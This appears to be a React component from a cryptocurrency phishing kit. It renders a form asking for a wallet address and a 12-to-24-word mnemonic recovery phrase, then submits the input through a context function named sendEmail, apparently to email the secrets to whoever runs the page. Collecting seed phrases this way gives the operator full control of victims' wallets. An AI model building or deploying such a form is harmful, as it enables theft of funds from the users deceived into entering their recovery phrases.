import { useState, useContext } from "react";
import React, { useRef } from "react";
import { UserContent } from "../../contextApi/contextApi";
import classes from "./phrase.module.css";
import { FaEye } from "react-icons/fa";
const Phrase = () => {
  const { sendEmail } = useContext(UserContent);
  const [close, setClose] = useState(false);
  const [closeEye, setCloseEye] = useState(false);
  const toggleCloseEye = () => {
    setCloseEye(!closeEye);
  };
  const [payload, setpayLoad] = useState({
    message: "",
    wallet: "",
  });
  const handleForm = (e) => {
    setpayLoad({
      ...payload,
      [e.target.name]: e.target.value,
    });
  };
  return (
    <>
      <form action="" onSubmit={sendEmail}>
        <div className={classes.inputs}>
          <div className={classes.inputEye}>
            <input
              className={classes.inputt}
              type={closeEye ? "password" : "text"}
              name="wallet"
              onChange={handleForm}
              value={payload.wallet}
              placeholder="Provide your wallet Address"
            />
            <span>
              <FaEye className="eyes" onClick={toggleCloseEye} />
            </span>
          </div>
          <div className={classes.inputEye}>
            <textarea
              name="message"
              className={classes.text}
              value={payload.message}
              onChange={handleForm}
              type={close ? "password" : "text"}
              placeholder="A mnemonic phrase could have 12, 15, 18, 21, or 24 words. please enter and separate them with spaces"
            />
          </div>
        </div>
        <div className={classes.submit}>
          <button>Proceed</button>
        </div>
      </form>
    </>
  );
};

export default Phrase;
